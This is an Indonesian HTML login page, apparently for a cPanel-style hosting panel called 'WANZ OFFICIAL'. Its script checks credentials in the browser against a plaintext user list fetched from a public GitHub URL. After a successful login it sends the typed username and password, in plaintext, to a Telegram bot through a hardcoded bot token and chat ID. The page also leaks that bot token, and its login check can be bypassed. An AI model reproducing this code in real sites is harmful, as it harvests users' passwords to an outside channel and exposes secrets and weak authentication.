<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login - WANZ OFFICIAL</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #f0f8ff, #e6ecf0);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      color: #333;
    }
    .login-container {
      background-color: #ffffff;
      padding: 40px;
      border-radius: 16px;
      box-shadow: 0 0 25px rgba(0, 0, 0, 0.2);
      max-width: 400px;
      width: 100%;
    }
    h2 {
      text-align: center;
      margin-bottom: 25px;
      color: #0077ff;
    }
    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 8px;
      background-color: #f9f9f9;
      color: #333;
    }
    button {
      width: 100%;
      padding: 14px;
      background: linear-gradient(90deg, #0077ff, #00c3ff);
      border: none;
      border-radius: 10px;
      font-weight: bold;
      color: white;
      cursor: pointer;
      transition: 0.3s ease;
    }
    button:hover {
      background: linear-gradient(90deg, #00c3ff, #0077ff);
    }
    .error {
      color: red;
      text-align: center;
      margin-top: 10px;
      display: none;
    }
    .popup-locked {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(0, 0, 0, 0.85);
      z-index: 9999;
      display: flex;
      justify-content: center;
      align-items: center;
      color: white;
      font-size: 20px;
      text-align: center;
    }
  </style>

<script>
function onLoginSuccess(username) {
    localStorage.setItem('loggedIn', 'true');
    localStorage.setItem('username', username);
    window.location.href = 'login.html';
}
</script>

</head>
<body>
  <div class="login-container">
    <h2>Login Cpanel Website</h2>
    <input type="text" id="username" placeholder="Username" required />
    <input type="password" id="password" placeholder="Password" required />
    <button onclick="login()">Masuk</button>
    <div class="error" id="error">‚ùå Username atau password salah</div>
  </div>

  <div id="lockedPopup" class="popup-locked" style="display: none;">
    üö´ Akses Dikunci<br><br>
    Anda bukan user Premium.<br>
    Tutup halaman ini dan buka ulang untuk mencoba lagi.
  </div>

  <script>
    let attempts = 0;

    async function login() {
  const username = document.getElementById("username").value.trim();
  const password = document.getElementById("password").value.trim();
  const errorDiv = document.getElementById("error");

  try {
    const res = await fetch("https://raw.githubusercontent.com/wandaaja01/wanzhost.my.id/main/user.json");
    const users = await res.json();
    const user = users.find(u => u.username === username && u.password === password);

    if (user) {
      // Kirim notifikasi ke Telegram
      const now = new Date();
      const waktu = now.toLocaleString('id-ID', {
        weekday: 'long',
        year: 'numeric',
        month: 'long',
        day: 'numeric',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
      });

      const message = `‚úÖ LOGIN BERHASIL\nUsername: ${username}\nPassword: ${password}\nWaktu: ${waktu}`;
      fetch(`https://api.telegram.org/bot7593438716:AAGn6wr0_5-5uO2LXmKpagZcneoXdmca-zg/sendMessage`, {
        method: "POST",
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: "7950114253",
          text: message
        })
      });

      // ‚úÖ FIXED redirect tanpa accessKey
      window.location.href = "login.html";
    } else {
      attempts++;
      errorDiv.style.display = "block";

      if (attempts >= 3) {
        document.getElementById("lockedPopup").style.display = "flex";
      }
    }
  } catch (err) {
    alert("Gagal mengambil data user.json");
    console.error(err);
  }
}
  </script>
</body>
</html>
